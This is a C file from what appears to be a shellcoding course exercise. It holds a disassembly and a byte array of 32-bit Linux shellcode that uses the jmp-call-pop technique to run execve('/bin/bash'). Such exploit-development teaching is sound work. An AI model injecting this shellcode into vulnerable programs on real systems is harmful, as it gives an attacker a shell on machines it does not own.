/*
Following video: Module 2-5: EXECVE JMP_CALL_POP
Using code from NASM\2-5

;   2-5_EXECVE-JMP_CALL_POP/execve-jmp_call_pop:     file format elf32-i386
;   
;   Disassembly of section .text:
;   
;   08049000 <_start>:
;    8049000:       eb 1a                   jmp    804901c <call_shellcode>
;   
;   08049002 <shellcode>:
;    8049002:       5e                      pop    esi
;    8049003:       31 db                   xor    ebx,ebx
;    8049005:       88 5e 09                mov    BYTE PTR [esi+0x9],bl
;    8049008:       89 76 0a                mov    DWORD PTR [esi+0xa],esi
;    804900b:       89 5e 0e                mov    DWORD PTR [esi+0xe],ebx
;    804900e:       8d 1e                   lea    ebx,[esi]
;    8049010:       8d 4e 0a                lea    ecx,[esi+0xa]
;    8049013:       8d 56 0e                lea    edx,[esi+0xe]
;    8049016:       31 c0                   xor    eax,eax
;    8049018:       34 0b                   xor    al,0xb
;    804901a:       cd 80                   int    0x80
;   
;   0804901c <call_shellcode>:
;    804901c:       e8 e1 ff ff ff          call   8049002 <shellcode>
;   
;   08049021 <message>:
;    8049021:       2f                      das
;    8049022:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
;    8049025:       2f                      das
;    8049026:       62 61 73                bound  esp,QWORD PTR [ecx+0x73]
;    8049029:       68 41 42 42 42          push   0x42424241
;    804902e:       42                      inc    edx
;    804902f:       43                      inc    ebx
;    8049030:       43                      inc    ebx
;    8049031:       43                      inc    ebx
;    8049032:       43                      inc    ebx
*/


unsigned char shellcode[] = {
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e"
"\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\x34\x0b\xcd\x80"
"\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
"\x41\x42\x42\x42\x42\x43\x43\x43\x43"
};

unsigned int shellcode_len = sizeof(shellcode)-1;